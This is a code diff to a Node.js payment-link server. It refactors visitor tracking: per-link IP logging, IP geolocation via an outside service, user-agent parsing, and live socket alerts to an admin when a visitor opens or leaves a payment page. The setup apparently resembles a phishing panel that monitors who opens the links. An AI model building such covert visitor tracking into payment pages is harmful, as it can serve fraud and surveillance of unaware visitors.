@@ -5,7 +5,7 @@ import crypto from 'crypto';
 import { Server } from 'socket.io';
 import path from 'path';
 import fs from 'fs';
-import fetch from 'node-fetch'; // Add this import for IP geolocation
+import fetch from 'node-fetch'; // Make sure this is installed
 
 // Generate a unique ID for this server instance
 const SERVER_ID = crypto.randomBytes(3).toString('hex');
@@ -51,99 +51,6 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Track visitors middleware and check for expired links
-app.use((req, res, next) => {
-  // Extract pid from the URL query parameters
-  const pid = req.query.pid;
-  
-  // Check if the URL contains a pid and if that link is expired
-  if (pid && isLinkExpired(pid)) {
-    console.log(`Redirecting expired link access: ${pid}`);
-    return res.redirect('/expired.html');
-  }
-  
-  // If not expired, continue with normal visitor tracking
-  if (pid) {
-    // Get visitor IP address
-    const ip = req.headers['x-forwarded-for'] || 
-               req.connection.remoteAddress || 
-               req.socket.remoteAddress || 
-               'Unknown';
-    
-    const timestamp = new Date().toLocaleString();
-    const lastActive = Date.now();
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    
-    // Check if this is a new visitor or an update
-    const isNewVisitor = !visitors.has(pid);
-    
-    // Store visitor info with lastActive timestamp and user agent
-    visitors.set(pid, { 
-      pid,
-      ip, 
-      timestamp,
-      url: req.originalUrl,
-      lastActive,
-      userAgent
-    });
-    
-    // Notify admin if this is a new visitor
-    if (isNewVisitor && io) {
-      io.emit('visitor', { 
-        pid, 
-        ip, 
-        timestamp, 
-        url: req.originalUrl,
-        lastActive,
-        userAgent
-      });
-    }
-  }
-  
-  // Block direct access to payment.html and currencypayment.html
-  if ((req.path === '/payment.html' || req.path === '/currencypayment.html') && !req.query.pid) {
-    return res.status(404).sendFile(path.join(__dirname, '404.html'));
-  }
-  
-  next();
-});
-
-// Heartbeat endpoint for active visitors to ping
-app.post('/api/visitor-heartbeat', (req, res) => {
-  const { pid } = req.body;
-  
-  if (pid && visitors.has(pid)) {
-    const visitor = visitors.get(pid);
-    visitor.lastActive = Date.now();
-    visitors.set(pid, visitor);
-    return res.json({ success: true });
-  }
-  
-  res.status(400).json({ success: false });
-});
-
-// Clean up inactive visitors periodically
-function cleanupInactiveVisitors() {
-  const now = Date.now();
-  let removed = 0;
-  
-  visitors.forEach((visitor, pid) => {
-    if (now - visitor.lastActive > VISITOR_TIMEOUT) {
-      visitors.delete(pid);
-      removed++;
-      
-      // Notify admin that visitor has left
-      if (io) {
-        io.emit('visitor_left', { pid });
-      }
-    }
-  });
-  
-  if (removed > 0) {
-    console.log(`Removed ${removed} inactive visitors`);
-  }
-}
-
 // Helper function to check if a payment link is expired
 function getPaymentIdFromUrl(url) {
   if (!url) return null;
@@ -182,67 +89,207 @@ function isLinkExpired(pid) {
   return false;
 }
 
-// Function to fetch IP geolocation data
-async function fetchGeoData(ip) {
-  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1')) {
-    return {
-      city: 'Local',
-      country: 'Local',
-      countryCode: 'LO',
-      isp: 'Local Network',
-      lat: 0,
-      lon: 0,
-      timezone: 'Local',
-      org: 'Local',
-      region: 'Local'
-    };
+// Track visitors middleware and check for expired links
+app.use((req, res, next) => {
+  // Extract pid from the URL query parameters
+  const pid = req.query.pid;
+  
+  // Check if the URL contains a pid and if that link is expired
+  if (pid && isLinkExpired(pid)) {
+    console.log(`Redirecting expired link access: ${pid}`);
+    return res.redirect('/expired.html');
   }
   
-  // Clean IP if it contains port or other information
-  const cleanIp = ip.split(',')[0].trim();
+  // If not expired, continue with normal visitor tracking
+  if (pid) {
+    // Get visitor IP address
+    const ip = req.headers['x-forwarded-for'] || 
+               req.connection.remoteAddress || 
+               req.socket.remoteAddress || 
+               'Unknown';
+    
+    const timestamp = new Date().toLocaleString();
+    const lastActive = Date.now();
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    // Check if this is a new visitor or an update
+    const isNewVisitor = !visitors.has(pid);
+    
+    // Store visitor info with lastActive timestamp and user agent
+    visitors.set(pid, { 
+      pid,
+      ip, 
+      timestamp,
+      url: req.originalUrl,
+      lastActive,
+      userAgent
+    });
+    
+    // Process location data for this visitor
+    fetchLocationData(ip).then(locationData => {
+      const visitor = visitors.get(pid);
+      if (visitor) {
+        visitor.city = locationData.city;
+        visitor.country = locationData.country;
+        visitor.countryCode = locationData.countryCode;
+        visitor.region = locationData.region;
+        visitor.isp = locationData.isp;
+        visitor.org = locationData.org;
+        visitor.lat = locationData.lat;
+        visitor.lon = locationData.lon;
+        visitor.browserInfo = getBrowserInfo(userAgent);
+        visitors.set(pid, visitor);
+      }
+    }).catch(err => {
+      console.error('Error fetching location data:', err);
+    });
+    
+    // Notify admin if this is a new visitor
+    if (isNewVisitor && io) {
+      io.emit('visitor', { 
+        pid, 
+        ip, 
+        timestamp, 
+        url: req.originalUrl,
+        lastActive,
+        userAgent
+      });
+    }
+  }
+  
+  // Block direct access to payment.html and currencypayment.html
+  if ((req.path === '/payment.html' || req.path === '/currencypayment.html') && !req.query.pid) {
+    return res.status(404).sendFile(path.join(__dirname, '404.html'));
+  }
+  
+  next();
+});
+
+// Get browser information from user agent
+function getBrowserInfo(userAgent) {
+  if (!userAgent) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
+  
+  let browser = 'Unknown';
+  let os = 'Unknown';
+  let device = 'Unknown';
+  
+  // Detect browser
+  if (userAgent.includes('Firefox')) browser = 'Firefox';
+  else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
+  else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
+  else if (userAgent.includes('Edg')) browser = 'Edge';
+  else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) browser = 'Internet Explorer';
+  else if (userAgent.includes('Opera') || userAgent.includes('OPR')) browser = 'Opera';
+  
+  // Detect OS
+  if (userAgent.includes('Windows')) os = 'Windows';
+  else if (userAgent.includes('Mac OS')) os = 'macOS';
+  else if (userAgent.includes('Linux') && !userAgent.includes('Android')) os = 'Linux';
+  else if (userAgent.includes('Android')) os = 'Android';
+  else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
+  
+  // Detect device
+  if (userAgent.includes('iPhone')) device = 'iPhone';
+  else if (userAgent.includes('iPad')) device = 'iPad';
+  else if (userAgent.includes('Android') && userAgent.includes('Mobile')) device = 'Android Phone';
+  else if (userAgent.includes('Android') && !userAgent.includes('Mobile')) device = 'Android Tablet';
+  else if ((userAgent.includes('Windows') || userAgent.includes('Mac OS') || userAgent.includes('Linux')) && 
+           !userAgent.includes('Mobile')) device = 'Desktop';
+  
+  return { browser, os, device };
+}
+
+// Fetch location data
+async function fetchLocationData(ip) {
+  // Default values in case of errors or local IPs
+  const defaultData = {
+    city: 'Unknown',
+    country: 'Unknown',
+    countryCode: 'UN',
+    region: 'Unknown',
+    isp: 'Unknown',
+    org: 'Unknown',
+    lat: 0,
+    lon: 0
+  };
+  
+  // Don't try to look up local IPs
+  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('localhost')) {
+    defaultData.city = 'Local';
+    defaultData.country = 'Local';
+    defaultData.countryCode = 'LO';
+    defaultData.isp = 'Local Network';
+    return defaultData;
+  }
   
   try {
-    console.log(`Fetching geolocation data for IP: ${cleanIp}`);
+    // Clean up IP if it has port or other information
+    const cleanIp = ip.split(',')[0].trim();
+    
+    // Fetch data from ipapi.co
     const response = await fetch(`https://ipapi.co/${cleanIp}/json/`);
     
     if (!response.ok) {
-      console.error(`IP lookup failed with status: ${response.status}`);
-      throw new Error('IP lookup failed');
+      throw new Error(`IP lookup failed with status ${response.status}`);
     }
     
     const data = await response.json();
-    console.log(`Geolocation data received for IP ${cleanIp}:`, data);
     
-    // Check if the API returned an error
+    // Check for API errors
     if (data.error) {
-      console.error(`IP API returned error:`, data.error);
+      console.error('IP API error:', data.error);
       throw new Error(data.error);
     }
     
     return {
-      city: data.city || 'Unknown',
-      country: data.country_name || 'Unknown',
-      countryCode: data.country_code || 'UN',
-      isp: data.org || data.asn || 'Unknown',
-      lat: data.latitude || 0,
-      lon: data.longitude || 0,
-      timezone: data.timezone || 'Unknown',
-      org: data.org || 'Unknown',
-      region: data.region || 'Unknown'
+      city: data.city || defaultData.city,
+      country: data.country_name || defaultData.country,
+      countryCode: data.country_code || defaultData.countryCode,
+      region: data.region || defaultData.region,
+      isp: data.org || data.asn || defaultData.isp,
+      org: data.org || defaultData.org,
+      lat: data.latitude || defaultData.lat,
+      lon: data.longitude || defaultData.lon
     };
   } catch (error) {
-    console.error('Error fetching geolocation data:', error);
-    return {
-      city: 'Error',
-      country: 'Unknown',
-      countryCode: 'UN',
-      isp: 'Error fetching data',
-      lat: 0,
-      lon: 0,
-      timezone: 'Unknown',
-      org: 'Unknown',
-      region: 'Unknown'
-    };
+    console.error('Error fetching IP data:', error);
+    return defaultData;
+  }
+}
+
+// Heartbeat endpoint for active visitors to ping
+app.post('/api/visitor-heartbeat', (req, res) => {
+  const { pid } = req.body;
+  
+  if (pid && visitors.has(pid)) {
+    const visitor = visitors.get(pid);
+    visitor.lastActive = Date.now();
+    visitors.set(pid, visitor);
+    return res.json({ success: true });
+  }
+  
+  res.status(400).json({ success: false });
+});
+
+// Clean up inactive visitors periodically
+function cleanupInactiveVisitors() {
+  const now = Date.now();
+  let removed = 0;
+  
+  visitors.forEach((visitor, pid) => {
+    if (now - visitor.lastActive > VISITOR_TIMEOUT) {
+      visitors.delete(pid);
+      removed++;
+      
+      // Notify admin that visitor has left
+      if (io) {
+        io.emit('visitor_left', { pid });
+      }
+    }
+  });
+  
+  if (removed > 0) {
+    console.log(`Removed ${removed} inactive visitors`);
   }
 }
 
@@ -263,7 +310,7 @@ const transactions = new Map();
 const paymentLinks = new Map();
 
 // Endpoint to get active visitor info
-app.get('/api/visitors', async (req, res) => {
+app.get('/api/visitors', (req, res) => {
   try {
     // Clean up any inactive visitors first
     cleanupInactiveVisitors();
@@ -271,85 +318,12 @@ app.get('/api/visitors', async (req, res) => {
     // Convert the Map to an Array of objects (only active visitors)
     const visitorList = Array.from(visitors.values());
     
-    // Process each visitor to add geo data if missing
-    for (let visitor of visitorList) {
-      if (!visitor.geoData && visitor.ip) {
-        try {
-          visitor.geoData = await fetchGeoData(visitor.ip);
-          
-          // Update the visitor in the Map
-          if (visitors.has(visitor.pid)) {
-            const existingVisitor = visitors.get(visitor.pid);
-            existingVisitor.geoData = visitor.geoData;
-            visitors.set(visitor.pid, existingVisitor);
-          }
-        } catch (error) {
-          console.error(`Error fetching geo data for visitor ${visitor.pid}:`, error);
-        }
-      }
-      
-      // Detect browser and device from user agent
-      if (visitor.userAgent && !visitor.browserInfo) {
-        visitor.browserInfo = {
-          browser: detectBrowser(visitor.userAgent),
-          os: detectOS(visitor.userAgent),
-          device: detectDevice(visitor.userAgent)
-        };
-        
-        // Update in the Map
-        if (visitors.has(visitor.pid)) {
-          const existingVisitor = visitors.get(visitor.pid);
-          existingVisitor.browserInfo = visitor.browserInfo;
-          visitors.set(visitor.pid, existingVisitor);
-        }
-      }
-    }
-    
     return res.json(visitorList);
   } catch (error) {
     console.error('Error getting visitors:', error);
     return res.status(500).json({ error: 'Failed to get visitors' });
   }
 });
-
-// Helper functions to detect browser and OS from user agent
-function detectBrowser(userAgent) {
-  if (!userAgent) return 'Unknown';
-  
-  if (userAgent.includes('Firefox')) return 'Firefox';
-  if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) return 'Chrome';
-  if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
-  if (userAgent.includes('Edg')) return 'Edge';
-  if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) return 'Internet Explorer';
-  if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera';
-  
-  return 'Unknown';
-}
-
-function detectOS(userAgent) {
-  if (!userAgent) return 'Unknown';
-  
-  if (userAgent.includes('Windows')) return 'Windows';
-  if (userAgent.includes('Mac OS')) return 'macOS';
-  if (userAgent.includes('Linux') && !userAgent.includes('Android')) return 'Linux';
-  if (userAgent.includes('Android')) return 'Android';
-  if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
-  
-  return 'Unknown';
-}
-
-function detectDevice(userAgent) {
-  if (!userAgent) return 'Unknown';
-  
-  if (userAgent.includes('iPhone')) return 'iPhone';
-  if (userAgent.includes('iPad')) return 'iPad';
-  if (userAgent.includes('Android') && userAgent.includes('Mobile')) return 'Android Phone';
-  if (userAgent.includes('Android') && !userAgent.includes('Mobile')) return 'Android Tablet';
-  if (userAgent.includes('Windows') && !userAgent.includes('Mobile')) return 'Desktop';
-  if (userAgent.includes('Mac OS') && !userAgent.includes('Mobile')) return 'Mac';
-  
-  return 'Unknown';
-}
 
 // Endpoint to get the pid for a transaction
 app.get('/api/getTransactionPid', (req, res) => {
